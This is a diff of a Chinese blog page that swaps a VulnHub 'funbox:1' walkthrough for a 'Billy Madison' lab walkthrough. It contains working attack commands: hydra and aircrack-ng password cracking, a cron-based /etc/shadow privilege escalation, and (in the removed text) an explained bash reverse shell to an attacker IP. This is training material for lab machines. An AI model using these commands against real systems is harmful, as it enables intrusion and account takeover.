@@ -16,40 +16,48 @@
   <meta name="author" content="rightevil">
   <meta name="keywords" content="">
   
-    <meta name="description" content="vulnhub靶机wp系列之funbox:1">
+    <meta name="description" content="帮助比利·麦迪逊阻止埃里克接管麦迪逊酒店！鬼鬼祟祟的埃里克·戈登（Eric Gordon）在比利的电脑上安装了恶意软件，就在他们两人准备在学术十项全能中对峙之前。除非比利能够重新控制他的机器并解密他 12 年级的期末项目，否则他将无法从高中毕业。此外，这意味着埃里克赢了，他接任了麦迪逊酒店的负责人！">
 <meta property="og:type" content="article">
-<meta property="og:title" content="vulnhub-wp funbox:1">
-<meta property="og:url" content="https://rightevil.github.io/vulnhub-wp-funbox1/index.html">
+<meta property="og:title" content="vulnhub-wp Billy Madison">
+<meta property="og:url" content="https://rightevil.github.io/vulnhub-wp-Billy-Madison/index.html">
 <meta property="og:site_name" content="rightevil">
-<meta property="og:description" content="vulnhub靶机wp系列之funbox:1">
+<meta property="og:description" content="帮助比利·麦迪逊阻止埃里克接管麦迪逊酒店！鬼鬼祟祟的埃里克·戈登（Eric Gordon）在比利的电脑上安装了恶意软件，就在他们两人准备在学术十项全能中对峙之前。除非比利能够重新控制他的机器并解密他 12 年级的期末项目，否则他将无法从高中毕业。此外，这意味着埃里克赢了，他接任了麦迪逊酒店的负责人！">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://c5cc8144.telegraph-image-1ba.pages.dev/file/7e214193ca77ae6d2758c.png">
-<meta property="og:image" content="https://c5cc8144.telegraph-image-1ba.pages.dev/file/e0b912d1bf1022b6b9223.png">
-<meta property="og:image" content="https://c5cc8144.telegraph-image-1ba.pages.dev/file/47643d14626051c3c09bd.png">
-<meta property="og:image" content="https://c5cc8144.telegraph-image-1ba.pages.dev/file/a54e76bbe009bd9abcdd7.png">
-<meta property="og:image" content="https://c5cc8144.telegraph-image-1ba.pages.dev/file/07382fb560a34d0ec3dd9.png">
-<meta property="og:image" content="https://c5cc8144.telegraph-image-1ba.pages.dev/file/094a4eac27394b27b02b9.png">
-<meta property="og:image" content="https://c5cc8144.telegraph-image-1ba.pages.dev/file/eedad5d0b0978b28b260a.png">
-<meta property="og:image" content="https://c5cc8144.telegraph-image-1ba.pages.dev/file/56ae90f4639c80ade9244.png">
-<meta property="og:image" content="https://c5cc8144.telegraph-image-1ba.pages.dev/file/13fc337e8d37e471ae16c.png">
-<meta property="og:image" content="https://c5cc8144.telegraph-image-1ba.pages.dev/file/b7b6b4af3149bae0c0995.png">
-<meta property="og:image" content="https://c5cc8144.telegraph-image-1ba.pages.dev/file/542b7d44ebc8de496e855.png">
-<meta property="og:image" content="https://c5cc8144.telegraph-image-1ba.pages.dev/file/cdabd8ccbe42d5dd99a36.png">
-<meta property="og:image" content="https://c5cc8144.telegraph-image-1ba.pages.dev/file/4bd2db2cd64b31a2b16c6.png">
-<meta property="og:image" content="https://c5cc8144.telegraph-image-1ba.pages.dev/file/820ac9f18fdb94c6a0373.png">
-<meta property="og:image" content="https://c5cc8144.telegraph-image-1ba.pages.dev/file/90b8aaa87687692b46389.png">
-<meta property="article:published_time" content="2023-10-11T14:58:35.000Z">
-<meta property="article:modified_time" content="2023-12-15T03:30:37.833Z">
+<meta property="og:image" content="https://c5cc8144.telegraph-image-1ba.pages.dev/file/c84b44e68c831d5bb6b28.png">
+<meta property="og:image" content="https://c5cc8144.telegraph-image-1ba.pages.dev/file/41c0b0d2d7080a15873d5.png">
+<meta property="og:image" content="https://c5cc8144.telegraph-image-1ba.pages.dev/file/997d24edcb9e3cfef5ae6.png">
+<meta property="og:image" content="https://c5cc8144.telegraph-image-1ba.pages.dev/file/5243bfc663b470d9c8a89.png">
+<meta property="og:image" content="https://c5cc8144.telegraph-image-1ba.pages.dev/file/4b9c05d1b0f0b5aa6a888.png">
+<meta property="og:image" content="https://c5cc8144.telegraph-image-1ba.pages.dev/file/45f9abdf33ba98f49b30b.png">
+<meta property="og:image" content="https://c5cc8144.telegraph-image-1ba.pages.dev/file/bc03ac5169c435d246ee1.png">
+<meta property="og:image" content="https://c5cc8144.telegraph-image-1ba.pages.dev/file/1e959b7602674464eb0eb.png">
+<meta property="og:image" content="https://c5cc8144.telegraph-image-1ba.pages.dev/file/b2ff23ee2f283b123522e.png">
+<meta property="og:image" content="https://c5cc8144.telegraph-image-1ba.pages.dev/file/6f4ea2dfef3d76ccca876.png">
+<meta property="og:image" content="https://c5cc8144.telegraph-image-1ba.pages.dev/file/a8e6e8d7b87302c45e098.png">
+<meta property="og:image" content="https://c5cc8144.telegraph-image-1ba.pages.dev/file/b33e1302ba9bb532d6706.png">
+<meta property="og:image" content="https://c5cc8144.telegraph-image-1ba.pages.dev/file/1e955d89673ed3fb7af75.png">
+<meta property="og:image" content="https://c5cc8144.telegraph-image-1ba.pages.dev/file/01df918eb7c3f46a0f9b2.png">
+<meta property="og:image" content="https://c5cc8144.telegraph-image-1ba.pages.dev/file/ca57562e6a420ca63a14f.png">
+<meta property="og:image" content="https://c5cc8144.telegraph-image-1ba.pages.dev/file/eaf6f9ff3a060c400420b.png">
+<meta property="og:image" content="https://c5cc8144.telegraph-image-1ba.pages.dev/file/4da69d96a6ee138ed0189.png">
+<meta property="og:image" content="https://c5cc8144.telegraph-image-1ba.pages.dev/file/a001dcb36c87bcc9eb740.png">
+<meta property="og:image" content="https://c5cc8144.telegraph-image-1ba.pages.dev/file/d8d3433d6f3912a577e06.png">
+<meta property="og:image" content="https://c5cc8144.telegraph-image-1ba.pages.dev/file/b056a9c35d4c3ba2ea361.png">
+<meta property="og:image" content="https://c5cc8144.telegraph-image-1ba.pages.dev/file/67e9daaeb42036fedf4f6.png">
+<meta property="og:image" content="https://c5cc8144.telegraph-image-1ba.pages.dev/file/509f5e95160690c1bdcb2.png">
+<meta property="og:image" content="https://c5cc8144.telegraph-image-1ba.pages.dev/file/f4f7a281a156d3ae7b58c.png">
+<meta property="article:published_time" content="2023-12-13T01:19:34.000Z">
+<meta property="article:modified_time" content="2023-12-15T03:32:24.689Z">
 <meta property="article:author" content="rightevil">
 <meta property="article:tag" content="vulnhub">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://c5cc8144.telegraph-image-1ba.pages.dev/file/7e214193ca77ae6d2758c.png">
+<meta name="twitter:image" content="https://c5cc8144.telegraph-image-1ba.pages.dev/file/c84b44e68c831d5bb6b28.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>vulnhub-wp funbox:1 - rightevil</title>
+  <title>vulnhub-wp Billy Madison - rightevil</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -280,7 +288,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="vulnhub-wp funbox:1"></span>
+            <span id="subtitle" data-typed-text="vulnhub-wp Billy Madison"></span>
           
         </div>
 
@@ -291,8 +299,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-10-11 22:58" pubdate>
-          2023年10月11日 晚上
+        <time datetime="2023-12-13 09:19" pubdate>
+          2023年12月13日 上午
         </time>
       </span>
     
@@ -304,7 +312,7 @@
         <i class="iconfont icon-chart"></i>
         
           <!-- compatible with older versions-->
-          2.7k 字
+          3k 字
         
       </span>
     
@@ -316,7 +324,7 @@
         
         
           <!-- compatible with older versions-->
-          23 分钟
+          25 分钟
         
       </span>
     
@@ -362,113 +370,71 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">vulnhub-wp funbox:1</h1>
+            <h1 style="display: none">vulnhub-wp Billy Madison</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="🔍-信息收集-Enumeration"><a href="#🔍-信息收集-Enumeration" class="headerlink" title="🔍 信息收集(Enumeration)"></a>🔍 信息收集(Enumeration)</h1><h2 id="🖳-主机发现-Host-Discover"><a href="#🖳-主机发现-Host-Discover" class="headerlink" title="🖳 主机发现(Host Discover)"></a>🖳 主机发现(Host Discover)</h2><p>我们使用netdiscover命令扫描kali的c段</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">netdiscover -r 192.168.61.0/24  <br></code></pre></td></tr></table></figure>
+                <h1 id="🖳-主机发现"><a href="#🖳-主机发现" class="headerlink" title="🖳 主机发现"></a>🖳 主机发现</h1><p>熟悉的netdiscover -r</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">─$ sudo netdiscover -r 192.168.234.0/24<br> Currently scanning: Finished!   |   Screen View: Unique Hosts                                <br> 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180                                   <br> _____________________________________________________________________________<br>   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      <br> -----------------------------------------------------------------------------<br> 192.168.234.45  00:0c:29:1f:87:52      1      60  VMware, Inc.                                    <br> 192.168.234.196 20:1e:88:ad:<span class="hljs-built_in">fc</span>:55      1      60  Intel Corporate                                 <br> 192.168.234.177 c6:62:32:b7:68:66      1      60  Unknown vendor  <br></code></pre></td></tr></table></figure>
+<p>目标机器是<strong>192.168.134.45</strong></p>
+<h1 id="👁-服务扫描"><a href="#👁-服务扫描" class="headerlink" title="👁 服务扫描"></a>👁 服务扫描</h1><p>使用nmap对其进行扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -p- 192.168.234.45 --min-rate 8000 <br></code></pre></td></tr></table></figure>
 <ul>
-<li><code>-r</code> 指定网段<blockquote>
-<p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/7e214193ca77ae6d2758c.png" srcset="/img/loading.gif" lazyload><br>发现目标机是<em>192.168.61.7</em></p>
-</blockquote>
-<h2 id="👁-端口扫描-Port-Scan"><a href="#👁-端口扫描-Port-Scan" class="headerlink" title="👁 端口扫描(Port Scan)"></a>👁 端口扫描(Port Scan)</h2>我们使用nmap进行一个全扫描<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -p- 192.168.61.7 -sV <br></code></pre></td></tr></table></figure></li>
-<li><code>-p-</code> 扫描全端口  (<em>注：这会产生比较大的流量</em>)</li>
-<li><code>-sV</code> 探测端口服务<blockquote>
-<p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/e0b912d1bf1022b6b9223.png" srcset="/img/loading.gif" lazyload><br>得到一个ftp，ssh，http还有一个类似mysql的服务</p>
+<li>–min-rate 设置最小发包速度为8000，在靶场环境可以快速扫描出结果<blockquote>
+<p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/c84b44e68c831d5bb6b28.png" srcset="/img/loading.gif" lazyload></p>
 </blockquote>
 </li>
 </ul>
-<h2 id="🕵‍♂-服务探测-Service-Detection"><a href="#🕵‍♂-服务探测-Service-Detection" class="headerlink" title="🕵‍♂ 服务探测(Service Detection)"></a>🕵‍♂ 服务探测(Service Detection)</h2><p>我们先从最简单的开始，http，访问目标的80端口。</p>
+<h1 id="🚪🚶-获取权限"><a href="#🚪🚶-获取权限" class="headerlink" title="🚪🚶 获取权限"></a>🚪🚶 获取权限</h1><p>一个个探测，经过尝试，smb服务中有一个txt文件，里面提示我们eric的后门以及关闭了。</p>
 <blockquote>
-<p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/47643d14626051c3c09bd.png" srcset="/img/loading.gif" lazyload><br>发现被重定向到了一个未知的url，那我们修改hosts文件把这个url绑定到目标ip，然后重新访问</p>
+<p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/41c0b0d2d7080a15873d5.png" srcset="/img/loading.gif" lazyload></p>
 </blockquote>
-<p>然后发现目标web的cms指纹是wp，那直接上专业工具</p>
+<p>23端口用telnet连接后，给了我们一个提示</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">telnet 192.168.234.45 23<br>***** HAHAH! You<span class="hljs-string">&#x27;re banned for a while, Billy Boy!</span><br><span class="hljs-string">By the way, I caught you trying to hack my wifi - but the joke&#x27;</span>s on you!<br>I don<span class="hljs-string">&#x27;t use ROTten passwords like rkfpuzrahngvat anymore!</span><br><span class="hljs-string">Madison Hotels is as good as MINE!!!! *****</span><br></code></pre></td></tr></table></figure>
+<p>这里给了一个rot13加密的一个字符串</p>
 <blockquote>
-<p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/a54e76bbe009bd9abcdd7.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/997d24edcb9e3cfef5ae6.png" srcset="/img/loading.gif" lazyload></p>
 </blockquote>
-<p>我们使用wpscan对目标网站进行扫描</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wpscan -e vp,vt,u --url http://funbox.fritz.box/<br></code></pre></td></tr></table></figure>
+<p>经过尝试后，这个解密后的字符串是一个web页面的路径<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/5243bfc663b470d9c8a89.png" srcset="/img/loading.gif" lazyload><br>从这个页面我们可以得到的信息有：</p>
 <ul>
-<li><code>-e vp,vt,u</code>指定使用主题漏洞扫描(vt),插件漏洞扫描(vp)，用户扫描(u)</li>
-<li><code>--url</code> 指定扫描目标<blockquote>
-<p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/07382fb560a34d0ec3dd9.png" srcset="/img/loading.gif" lazyload><br>发现枚举出了俩个用户，可以去登录界面试试弱口令</p>
-</blockquote>
-</li>
+<li>veronica使用她的名字作为密码</li>
+<li>有一个流量文件在这个路径下，也使用的和veronica相关的名字</li>
 </ul>
-<h1 id="🚪🚶-获取权限-Foothold"><a href="#🚪🚶-获取权限-Foothold" class="headerlink" title="🚪🚶 获取权限(Foothold)"></a>🚪🚶 获取权限(Foothold)</h1><h2 id="💲-ssh获取shell-ssh-get-shell"><a href="#💲-ssh获取shell-ssh-get-shell" class="headerlink" title="💲 ssh获取shell(ssh get shell)"></a>💲 ssh获取shell(ssh get shell)</h2><p>经过尝试，发现用户joe有弱口令<em>12345</em>，那我们可以联想到是否ftp和ssh也有弱口令？<br>直接上hydra(九头蛇)爆破试试，注：<em>在真实渗透测试中，我们应该尽量减少暴力破解的次数，或者应当在收集到了足够的信息再去爆破</em></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra -l joe -P top1000.txt -v 192.168.61.7 ssh -t 4<br></code></pre></td></tr></table></figure>
+<p>那我们先得到一个关于veronica的字典</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /usr/share/wordlists/rockyou.txt | grep veronica &gt; pass.txt<br></code></pre></td></tr></table></figure>
+<p>使用dirbuster进行爆破</p>
+<blockquote>
+<p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/4b9c05d1b0f0b5aa6a888.png" srcset="/img/loading.gif" lazyload><br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/45f9abdf33ba98f49b30b.png" srcset="/img/loading.gif" lazyload></p>
+</blockquote>
+<p>从这个流量文件中，我们可以分析出俩个重要信息</p>
 <ul>
-<li><code>-l</code> 指定用户名</li>
-<li><code>-P</code> 指定密码字典</li>
-<li><code>-v</code> 指定详细信息输出，将会输出爆破进度</li>
-<li><code>ip + 服务名</code></li>
-<li><code>-t</code> 指定线程为4，在ssh爆破时，应使用hydra推荐的线程数4<blockquote>
-<p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/094a4eac27394b27b02b9.png" srcset="/img/loading.gif" lazyload><br>接下来我们就可以使用弱口令直接ssh登录joe用户</p>
-</blockquote>
-</li>
+<li>eric在机器上有一个ftp账号</li>
+<li>该机器的ftp使用了knock服务，需要以一个特定序列进行”敲门”后才会开放</li>
 </ul>
-<h2 id="🏃-rbash逃逸-rbash-escape"><a href="#🏃-rbash逃逸-rbash-escape" class="headerlink" title="🏃 rbash逃逸(rbash escape)"></a>🏃 rbash逃逸(rbash escape)</h2><p>我们可以发现，获取的是一个rbash，这个时候我们就要进行rbash逃逸。<br>注：<em>这里的pspy64文件是我之前打靶的时候就已经下载了的文件</em></p>
-<blockquote>
-<p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/eedad5d0b0978b28b260a.png" srcset="/img/loading.gif" lazyload></p>
-</blockquote>
-<p>逃逸方法有很多种，我这里就用python来逃逸</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></code></pre></td></tr></table></figure>
-<p>然后我们先看看mbox是个什么东西(一般自己家目录下都会有点东西提示)</p>
-<blockquote>
-<p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/56ae90f4639c80ade9244.png" srcset="/img/loading.gif" lazyload><br>重点解读就是joe用户帮root用户写过一个脚本，还有joe用户将密码设成了12345</p>
-</blockquote>
-<h1 id="🛡️-权限提升-Privilege-Escalation"><a href="#🛡️-权限提升-Privilege-Escalation" class="headerlink" title="🛡️ 权限提升(Privilege Escalation)"></a>🛡️ 权限提升(Privilege Escalation)</h1><p>然后我们就是找这个脚本，后经过一番寻找，我们最终在funny的家目录下发现了backup脚本，还有一个网站的打包文件</p>
-<blockquote>
-<p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/13fc337e8d37e471ae16c.png" srcset="/img/loading.gif" lazyload><br>到了这，我们可以猜测这个就是joe用户写的脚本，脚本里面的内容是对/var/www/html目录进行打包。那就很明显了，和网站备份相关的计划任务。</p>
-</blockquote>
-<p>为了验证我们的猜想，我们用pspy工具检测一下</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64<br><span class="hljs-built_in">chmod</span> +x pspy64<br>./pspy64 -d /home/funny<br></code></pre></td></tr></table></figure>
+<p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/bc03ac5169c435d246ee1.png" srcset="/img/loading.gif" lazyload><br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/1e959b7602674464eb0eb.png" srcset="/img/loading.gif" lazyload><br>注：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/f-carey/p/16066178.html"><em>knock服务科普</em></a><br>无需多言，我们敲门<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/b2ff23ee2f283b123522e.png" srcset="/img/loading.gif" lazyload><br>注：<strong>若是登录ftp的时候报错有关passive的话先输入<code>passive</code>命令进入passive mode</strong></p>
+<p>登录上ftp服务器后，在eric的目录下找到一个.note文件，里面记载了一个后门的打开方法，以及eric的ssh密码在veronica或者billy的目录下。我们爆破一下veronica的ftp试试<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/6f4ea2dfef3d76ccca876.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra -l veronica -P pass.txt 192.168.234.45 ftp<br></code></pre></td></tr></table></figure>
+<p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/a8e6e8d7b87302c45e098.png" srcset="/img/loading.gif" lazyload><br>登录上veronica后，我们可以找到一个eml文件和一个cap流量文件，把他下载下来分析一下后发现流量是wifi流量，邮件中也提到了这一点。而wifi的密码就是eric的ssh密码<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/b33e1302ba9bb532d6706.png" srcset="/img/loading.gif" lazyload><br>那我们用aircrack-ng爆破一下wifi密码试试</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aircrack-ng eg-01.cap -w /usr/share/wordlists/rockyou.txt<br></code></pre></td></tr></table></figure>
+<p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/1e955d89673ed3fb7af75.png" srcset="/img/loading.gif" lazyload><br>在爆破的同时，我们也发送一下邮件，激活后门</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">telnet 192.168.234.45 2525<br></code></pre></td></tr></table></figure>
+<p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/01df918eb7c3f46a0f9b2.png" srcset="/img/loading.gif" lazyload><br>现在我们再进行一个nmap扫描，查看是否有新的服务开启</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -p- -sV 192.168.234.45 --min-rate 10000<br></code></pre></td></tr></table></figure>
+<p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/ca57562e6a420ca63a14f.png" srcset="/img/loading.gif" lazyload><br>我们可以使用<strong>eric:triscuit*</strong> 去ssh连接</p>
+<h1 id="🛡️-提升权限"><a href="#🛡️-提升权限" class="headerlink" title="🛡️ 提升权限"></a>🛡️ 提升权限</h1><p>我们在本地开启python的web服务，然后在靶机上用wget下载辅助提权脚本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">kali:<br>python3 -m http.server 80<br><br>eric@BM:/tmp$ wget http://192.168.234.130/linpeas.sh<br>--2023-12-03 06:56:14--  http://192.168.234.130/linpeas.sh<br>Connecting to 192.168.234.130:80... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 847815 (828K) [text/x-sh]<br>Saving to: ‘linpeas.sh’<br><br>linpeas.sh               100%[==================================&gt;] 827.94K  --.-KB/s    <span class="hljs-keyword">in</span> 0.01s   <br><br>2023-12-03 06:56:14 (56.4 MB/s) - ‘linpeas.sh’ saved [847815/847815]<br><br>eric@BM:/tmp$ <span class="hljs-built_in">chmod</span> +x linpeas.sh <br></code></pre></td></tr></table></figure>
+<p>运行脚本之后，我们可以找到一个有趣的文件<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/eaf6f9ff3a060c400420b.png" srcset="/img/loading.gif" lazyload><br>我们从整个eric的攻击流程可以知道他使用了一个钓鱼的手法让veronica下载了一个恶意文件，我们可以检查一下这个文件的md5值</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">eric@BM:/tmp$ <span class="hljs-built_in">md5sum</span> /usr/local/share/sgml/donpcgd<br>cd3621324a40c20e54aad9ecef2f6ed5  /usr/local/share/sgml/donpcgd<br></code></pre></td></tr></table></figure>
+<p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/4da69d96a6ee138ed0189.png" srcset="/img/loading.gif" lazyload><br>我们用google搜索dgcpnod后即可发现这个exploit的利用方法<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/a001dcb36c87bcc9eb740.png" srcset="/img/loading.gif" lazyload><br>而具体的exp如下<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/d8d3433d6f3912a577e06.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">eric@BM:/tmp$ <span class="hljs-built_in">touch</span> /tmp/rootme; <span class="hljs-built_in">chmod</span> +x /tmp/rootme; /usr/local/share/sgml/donpcgd /tmp/rootme /etc/cron.hourly/rootme; <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&#x27;#!/bin/bash \n chmod 777 /etc/shadow&#x27;</span> &gt; /etc/cron.hourly/rootme<br><span class="hljs-comment">#### mknod(/etc/cron.hourly/rootme,81fd,0)</span><br></code></pre></td></tr></table></figure>
+<p>然后我们可以用watch命令监察/etc/shadow</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">watch -n 5 <span class="hljs-string">&quot;ls -la /etc/shadow&quot;</span><br></code></pre></td></tr></table></figure>
 <ul>
-<li><code>-d</code> 指定要观察的目录<br>pspy（也称为”pspy64”）是一个用于监视进程活动的工具，特别是在Linux环境中。它允许用户监视正在运行的进程，查看它们的活动和与文件系统的交互，以及与其他进程的通信。pspy是一个轻量级的工具，通常被用于安全审计和故障排除，也可以用于发现潜在的安全问题。<blockquote>
-<p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/b7b6b4af3149bae0c0995.png" srcset="/img/loading.gif" lazyload><br>果然，是发现有一个root的计划任务和funny的计划任务，后面更是发现，root是5分钟执行一次，funny用户是2分钟执行一次</p>
-</blockquote>
-<h2 id="💀-反弹root-shell-reverse-root-shell"><a href="#💀-反弹root-shell-reverse-root-shell" class="headerlink" title="💀 反弹root shell(reverse root shell)"></a>💀 反弹root shell(reverse root shell)</h2>因为我们对backup有修改权限，我们直接在backup脚本中写入反弹shell的语句<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash -i &gt;&amp; /dev/tcp/192.168.61.126/1234 0&gt;&amp;1<br></code></pre></td></tr></table></figure></li>
-<li><code>bash -i</code> 这部分启动Bash shell，并使用-i标志表示要以交互方式运行，这意味着它可以接收用户输入并显示输出</li>
+<li><code>-n</code> 指定每次监察间隔<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/b056a9c35d4c3ba2ea361.png" srcset="/img/loading.gif" lazyload><br>这时我们就可以修改shadow文件来提权(稳妥起见可以先对shadow文件进行备份，不管是修改shadow文件还是passwd文件，原理都是一样的)<br>第一步：生成密码<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mkpasswd -m sha-512 root <br></code></pre></td></tr></table></figure></li>
+<li><code>-m</code> 加密指定模式<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/67e9daaeb42036fedf4f6.png" srcset="/img/loading.gif" lazyload><br>第二步：将原来的hash值或者x(passwd文件)替换为我们生成的hash值<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/509f5e95160690c1bdcb2.png" srcset="/img/loading.gif" lazyload><br>至此，提权成功，使用su切换到root用户<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/f4f7a281a156d3ae7b58c.png" srcset="/img/loading.gif" lazyload></li>
 </ul>
-<ul>
-<li><code>&gt;&amp; /dev/tcp/192.168.61.126/1234</code> 这是一个重定向操作符，将Bash的标准输出和标准错误（1和2）都重定向到指定的IP地址和端口上的网络连接。具体来说，它将输出重定向到/dev/tcp/192.168.61.126/1234。 </li>
-<li><code>0&gt;&amp;1</code> 这也是一个重定向操作符，将标准输入（0）重定向到与标准输出相同的地方，也就是之前重定向到网络连接的位置。</li>
-</ul>
-<p><em>这个命令的作用是将Bash shell的输入和输出连接到IP地址192.168.61.126上的端口1234，这通常用于建立与另一台计算机的反向Shell连接，使远程主机可以控制和执行命令在被攻击的主机上</em><br>这是一个常见的bash反弹shell的语句，然后我们在kali开启nc监听</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lnvp 1234<br></code></pre></td></tr></table></figure>
-<ul>
-<li><code>-l</code>: 这是netcat的一个选项，用于指示netcat进入监听模式，即等待传入连接。</li>
-<li><code>-n</code>: 这是另一个选项，用于指示netcat不要执行DNS解析，以便更快地处理连接。</li>
-<li><code>-v</code>: 这是一个选项，用于启用详细的输出，通常用于调试目的。</li>
-<li><code>-p</code>: 指定netcat监听的端口号。在这个例子中，它监听端口1234。</li>
-</ul>
-<blockquote>
-<p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/542b7d44ebc8de496e855.png" srcset="/img/loading.gif" lazyload><br>多次监听后也是成功拿到了root的shell</p>
-</blockquote>
-<h1 id="🐇-兔子洞-rabbit-hole"><a href="#🐇-兔子洞-rabbit-hole" class="headerlink" title="🐇 兔子洞(rabbit hole)"></a>🐇 兔子洞(rabbit hole)</h1><p>一开始我们在wpscan扫描出来的另外一个用户，admin，我们拿到joe的shell后可以去网站目录下看wp的配置文件，然后进入数据库查看用户名和密码</p>
-<blockquote>
-<p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/cdabd8ccbe42d5dd99a36.png" srcset="/img/loading.gif" lazyload></p>
-</blockquote>
-<p>接着我们把这个给复制出来，用john去爆破这个hash值</p>
-<blockquote>
